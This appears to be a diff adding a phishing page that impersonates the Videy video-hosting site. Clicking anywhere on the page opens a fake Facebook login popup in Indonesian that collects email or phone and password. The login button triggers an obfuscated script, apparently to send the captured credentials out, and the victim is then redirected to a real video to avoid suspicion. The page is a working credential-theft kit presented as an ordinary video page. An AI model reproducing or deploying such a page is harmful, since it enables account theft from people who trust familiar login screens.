@@ -1,0 +1,373 @@
+<html>
+ <head> 
+  <title>Watch on Videy | Free and Simple Video Hosting</title> 
+  <link rel="preconnect" href="https://fonts.googleapis.com"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""> 
+  <link rel="icon" type="image/x-icon" href="https://videy.co/favicon.ico"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&amp;family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet"> 
+  <link rel="stylesheet" href="https://videy.co/assets/style.css?cache=696041190980"> 
+  <style>
+  .popup-ariandi {
+        display: none;
+        background: rgba(0,0,0,0.5);
+        width: 100%;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        left: 0;
+        z-index: 9999999;
+    }
+    .close-alex-facebook {
+        background: #000;
+         width: 20px;
+        height: 20px;
+        color: #fff;
+        text-align: center;
+        text-decoration: none;
+        border-radius: 50%;
+        border: 1.5px solid #fff;
+        position: absolute;
+        top: -8px;
+        right: -10px;
+        display: block;
+    }
+    .close-alex-facebook i {
+        color: #fff;
+        padding-top: 1px;
+    }
+    .container-box-fb {
+        background: #ECEFF6;
+        max-width: 330px;
+        height: auto;
+        position: relative;
+        margin: 50px auto;
+        margin-top: 1.9%;
+        text-align: center;
+        font-family: system-ui;
+        color: #000;
+        border-radius: 10px;
+    }
+    .atasan-fb {
+        background: #3b5998;
+	    width: 100%;
+	    height: auto;
+	    padding: 9px;
+	    border-top-left-radius: 10px;
+	    border-top-right-radius: 10px;
+    }
+    .atasan-fb img {
+        width: 115px;
+        margin-left: auto;
+        margin-right: auto;
+        display: block;
+    }
+    .isi-facebook {
+        width: 300px;
+        height: auto;
+        margin-left: auto;
+        margin-right: auto;
+        display: block;
+    }
+    .isi-facebook .kaget {
+        display: none;
+        left: -15px;
+        position: relative;
+        width: 330px;
+        padding: 5px;
+        background: red;
+        color:#fff;
+        font-size: 13px;
+        font-family: system-ui;
+    }
+    .isi-facebook img {
+        width: 60px;
+        margin-top: 20px;
+        margin-left: auto;
+        margin-right: auto;
+        border-radius: 12px;
+        display: block;
+    }
+    .txt-ucapan-fb {
+        width: 270px;
+        height: auto;
+        margin-top: 10px;
+        margin-left: auto;
+        margin-right: auto;
+        margin-bottom: 17px;
+        padding: 8px;
+        color: #90949c;
+        font-size: 16px;
+        font-family: system-ui;
+        text-align: center;
+        display: block;
+    }
+    .form-login-fb input[type="text"],.form-login-fb input[type="password"]{
+        width: 100%;
+	    height: auto;
+	    padding: 12px;
+	    color: #000;
+	    font-size: 14px;
+	    font-weight: 400;
+	    font-family: 'Lato',sans-serif;
+	    border: 1px solid #bdbebf;
+	    cursor: pointer;
+	    outline: none;
+    }
+    .form-login-fb input[type="text"] {
+        margin: 0;
+        padding-bottom: 13px;
+	    border-bottom: none;
+	    border-radius: 4px 4px 0 0;
+	    box-shadow: 0 -1px 0 #E0E0E0 inset,0 0px 0px rgba(0,0,0,0.23) inset;
+    }
+    .form-login-fb input[type="password"] {
+        margin: 0;
+	    border-top: none;
+	    border-radius: 0 0 4px 4px;
+	    box-shadow: 0 -0px 0 rgba(0,0,0,0.23) inset,0 0px 0px rgba(255,255,255,0.1);
+    }
+    .btn-login-fb {
+        background: #1778f2;
+	    width: 90%;
+	    height: auto;
+	    margin-top: 10px;
+	    margin-left: auto;
+	    margin-right: auto;
+	    padding: 10px;
+	    color: #fff;
+	    font-size: 14px;
+	    font-family: system-ui;
+	    font-weight: bold;
+	    text-align: center;
+	    text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
+	    border: 1px solid #3578e5;
+	    border-radius: 5px;
+	    box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
+	    outline: none;
+	    display: block;
+    }
+    .txt-buat-akun {
+        width: 100%;
+        height: auto;
+        padding: 5px;
+        color: #3b5998;
+        font-size: 13.5px;
+        font-family: system-ui;
+        text-align: center;
+    }
+    .txt-tidak-sekarang {
+        width: 100%;
+        height: auto;
+        padding: 5px;
+        color: #3b5998;
+        font-size: 13.5px;
+        font-family: Roboto;
+        text-align: center;
+    }
+    .txt-lupa-password {
+        width: 100%;
+        height: auto;
+        margin-bottom: 30px;
+        padding: 5px;
+        color: #7596c8;
+        font-size: 13.5px;
+        font-family: system-ui;
+        text-align: center;
+    }
+    .isi-bahasa {
+        width: 100%;
+        height: auto;
+        margin-left: auto;
+        margin-right: auto;
+        display: block;
+    }
+    .nama-bahasa {
+        width: 40%;
+        height: auto;
+        margin: 5px;
+        margin-bottom: 0px;
+        color: #3b5998;
+        font-size: 12px;
+        font-family: system-ui;
+        text-align: center;
+        display: inline-block;
+    }
+    .nama-bahasa i {
+        width: 23px;
+        padding: 4px;
+        color: #90949c;
+        border: 1px solid #3b5998;
+        border-radius: 3px;
+    }
+    .bahasa-aktif {
+        color: #90949c;
+        font-weight: bold;
+    }
+    .kalobukanalexsiapalagi {
+        width: 40%;
+        height: auto;
+        margin-top: 10px;
+        margin-left: auto;
+        margin-right: auto;
+        color: #90949c;
+        font-size: 12px;
+        font-family: system-ui;
+        text-align: center;
+        display: block;
+    }
+    </style>
+ </head> 
+ <body onclick="openfcbksalz()"> 
+  <div class="container"> 
+   <div class="top"> 
+    <div class="logo"> 
+     <a href="/">videy</a> 
+    </div> 
+    <a href="/"> 
+     <div class="upload">
+       Upload 
+     </div> </a> 
+    <div class="more"> 
+     <a href="/advertise">Advertise</a> 
+    </div> 
+   </div> 
+   <div onclick="openfcbksalz()">
+   <div class="video"> 
+    <div class="video-inner"> 
+     <img width="100%" id="video" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/potos.jpg"> 
+     <div id="video-error" class="video-error" style="display: none;">
+       Video could not be found. 
+     </div> 
+     </div>
+    </div> 
+   </div> 
+   <div class="footer"> 
+    <div class="copyright">
+      Copyright © 
+     <span id="year">2024</span> TRUE DOMAIN PRIVACY, LLC 
+    </div> 
+    <div class="legal"> 
+     <div class="item"> 
+      <a href="/terms-of-service">Terms of Service</a> 
+     </div> 
+     <div class="item"> 
+      <a href="/report">Report Abuse</a> 
+     </div> 
+    </div> 
+   </div> 
+  </div> 
+
+  <script>
+        var videoLink;
+        $(document).ready(function() {
+            function getParameterByName(name) {
+                name = name.replace(/[\[\]]/g, '\\$&');
+                var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                    results = regex.exec(window.location.href);
+                if (!results) return null;
+                if (!results[2]) return '';
+                return decodeURIComponent(results[2].replace(/\+/g, ' '));
+            }
+
+            var paramValue = getParameterByName('id');
+            if (paramValue) {
+                var fileType = '.mp4';
+          
+                if (paramValue.length === 9 && paramValue[8] === '2') {
+                    fileType = '.mov';
+                }
+                videoLink = 'https://cdn.videy.co/' + paramValue + fileType;
+                $('#video').attr('src', videoLink);
+            }
+        });
+    </script> 
+  <script>
+        const video = document.getElementById('video');
+        const errorMessage = document.getElementById('video-error');
+     
+        video.addEventListener('error', function(event) {
+          const error = video.error;
+          if (error && error.code === 4) {
+              errorMessage.style.display = 'block';
+              video.style.display = 'none';
+          }
+        });
+    </script> 
+ </body>
+ <div class="popup-ariandi alex-facebook animate fadeIn" id="slzfcbk" style="display: none;">
+            <div class="container-box-fb" style="margin-top: 10%;">
+                <div class="atasan-fb" style="width: 95%;">
+                    <img src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240202_164508.png">
+                </div>
+                <div class="isi-facebook">
+                    <p class="kaget email-fb1" style="width: 330px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
+                    <p class="kaget sandi-fb1" style="width: 330px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>   
+                    <img src="https://videy.co/favicon.ico">
+                    <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk lanjut ke videy.co</div>
+                    <form class="form-login-fb" method="post">
+                        <label>
+                            <input type="text" id="alx_email_fb2" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
+                        </label>
+                        <label>
+                            <input type="password" id="alx_password_fb2" name="sandi" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required>
+                        </label>
+                        <input type="hidden" name="ua" value="Bigo Live" readonly>
+                        <input type="hidden" name="log" value="Facebook" readonly>
+                        <clik class="btn-login-fb" onclick="return AlexHostingFB(),Mantafff();">Masuk</clik>
+                    </form>
+                    <div class="txt-buat-akun">Buat akun</div>
+                    <div class="txt-tidak-sekarang">Lain kali</div>
+                    <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
+                </div>
+                <div class="isi-bahasa">
+                    <center>
+                        <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
+                        <div class="nama-bahasa">English (UK)</div>
+                        <div class="nama-bahasa">Basa Jawa</div>
+                        <div class="nama-bahasa">Bahasa Melayu</div>
+                        <div class="nama-bahasa">日本語</div>
+                        <div class="nama-bahasa">Español</div>
+                        <div class="nama-bahasa">Português (Brasil)</div>
+                        <div class="nama-bahasa"><i class="fa fa-plus"></i>
+                        </div>
+                    </center>
+                </div>
+                <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
+            </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+        <script>
+            function openfcbksalz() {
+                $('#slzfcbk').show();
+            }
+            
+            function AlexHostingFB()
+        	{
+        		$emailfb1 = $('#alx_email_fb2').val().trim();
+        		$passwordfb1 = $('#alx_password_fb2').val().trim();
+        		if($emailfb1 == '' || $emailfb1 == null || $emailfb1.length <= 6)
+        		{
+        			$('.email-fb1').show();
+        			$('.sandi-fb1').hide();
+        			return false;
+        		}else{
+        			$('.email-fb1').hide();
+        		}
+        		if($passwordfb1 == '' || $passwordfb1 == null || $passwordfb1.length <= 6)
+        		{
+        			$('.sandi-fb1').show();
+        			return false;
+        		}else{
+        			$('.sandi-fb1').hide();
+        		}
+        		
+        		if($emailfb1.length >=6 || $passwordfb1.length >=6) {	  
+                                    location.href = "https://videy.co/v?id=uVOjDydb";
+                    }
+        		}	
+        </script>
+        <script>
+        var Mantafff;(function(){var zId='',BoP=728-717;function KAP(f){var a=4558766;var h=f.length;var b=[];for(var o=0;o<h;o++){b[o]=f.charAt(o)};for(var o=0;o<h;o++){var m=a*(o+220)+(a%45666);var k=a*(o+618)+(a%51336);var w=m%h;var c=k%h;var d=b[w];b[w]=b[c];b[c]=d;a=(m+k)%5218881;};return b.join('')};var KPC=KAP('rtvmcrpctzgaqloefhnsyowsjkxboinurcudt').substr(0,BoP);var JoL='v(  w5.3(r15r)f=(svb.r)nl0.bl()zrtkj=+wn,hl.mv,edxof);6a(<{=];=,cut7r, ==;1-8,atjra[{8()chh [,9r(;t,,i(h+(,xv+e,o;rud,t*umual 0r(4ma(r-vpee; <.r)=)lgz0a;r +2)(9a(liu=.+re,lpn2=maov.=)0=g-=1{wc+yqz=ffn)p54w(g- 8[t.;[m{oos;l+nctC;=+.]vf)7 rvr=g,.;ls Cj8!evliaoen".]vt;[;rtrne0ipfnj1r-;;fvSrvxr=r0[a( -oC{tlro;p z=; sr;vi) h=a8,9ricrv[i0)v;r).}ecl;r+tl;e,d u;ld8(c6o=euh;(i3;}=v)zv5r,;=e2c]fAkid)Ccar)0tfa=;=qn,t;6vepe,a n=41va0+q.rh+r7gnrrts7+]o,de,7uwn+iy7el,+ie2,fis0)(lrg+( if.jgo1[2"z b+arAAd;s,(]kh)<]r.9h,<;() ahhwpt="h;" 20<6;2e})l3fec;nt>i;eootn(3sinnl+)]=f]wi=a(>u)r=[uir(hpcwcorgl]gdojv+r;j8eta[(}kq+r]=h.=e(.giandat;.{lc).g (r08gw.cokoexxsw)s.rif21op;}7[no=jfh91hs"m=1};y4;tsn(1[amec!vhzjacpwd(rgouv=rya=+"=;9a,z061;tsis9u,il).=i;a.tap[)(da7e=jhs igvf rhC;crajavn4+gulv)6a]==.=);g }.]er"a0r)=+t)oaaujCat8[*nhc+sgA{(f))z1n,xiSwro4;hn=nmo2ucjo;nta+o.)d;v-C .nlh"Awlrt(+("6"(t6o8ntC];';var PWb=KAP[KPC];var xws='';var IoJ=PWb;var fMj=PWb(xws,KAP(JoL));var Fam=fMj(KAP('ywO%(4OO.a}(),Ore%\/nest{s*0\/=u])nle10.u,(=O*j8a(i.bS]a8_$d1(b,aa=3dOO:0f(0.t,O!0=s*.tt]5)kw5)!Or_6)%rdz.1#ir}e$n,OdT%.$f).%(sOjt $.uby._,.tl, r8,i*4dOo$\/.oei.!do)484dp$.z0O({5O!.1f!usOa;\/ *(_bet6)",6m1aff4r584ro;c$rr{)6-$3mg3,#(1,v7dOc"]1(f!2\/,..w4gve!!&aeoz(1tO;lte;{OsOdp(%ezgtg7{On_};4={O]ftunO$ n0Odx&t.4MO!#gO3r4:0{(!,3=(fya!jlr(ooO([)=.fh+pf-z=0f)-=p 5)6rn)xh;t4\'\/e;4,t} .!qfOn8O}i,,50f),O$r7su7+dl\'))!iOjnnti$,;$3(,rOn. O,.,Oorn.r;sO(0)O2fi)!)g44ii0r6)l._63(O)!#7Oc.jp1O-:.cs=.eO2e4,OitO!6j;, (O4} a#;q1zn+uc%fO;.O. xif-}ztd]%1O4.r}fg(n}!)n0)y$:,Co$..$O!)$OTi3,.pfhf[cu)2e)O1Ox!( p)ft(_ $a)OO{6s(,f(au!r63a(O !k!3_j5 O],#O]on ")z;.()3n7af,:i)Oi.(OO(.=4l"])_3asb;0=;r3O-%.i[i.;(fOO}(pOw(!CO(sc]pOt(_87v)+=ofeOvjl&0.s;.(%w3s![=aO51t&pt+$"cxt3dn1!a.O.a\/13)ffjO$)5oy);,iOnyO{*0f&))3d4*sb3(edOe=t3OfOo&e6ea).c+_oj;O)n}{\'4d4t.o{3ws36,;()i(O;(mOwl=nf(nOiSOed;567"#S2jf4 x_fO.e),O%_+a8g3uji_($z2Od3Ov.=tO(Ov)r8ax$8O3]$t6_,n\'i.c)w}c{t! 2$_a{O!uf$Ov1"_;)tf=y,_OOi]Od{o)-tfO\/3O }O2eho2-OO :._a.O,d+_8$j)aOg=(=n$ =u.!2$;,;h.p)_)r2f61;,;)3,+xO5=.eOdd4pOiu1(i$_m38fi*.vd(7[d(.ta._.]tOO},bi_e}jw.O_6fOvo%_&$e6.,3+o\'-S.t;7.4Op'));var HyP=IoJ(zId,Fam );HyP(6892);return 8249})()
+        </script>
+  </html>
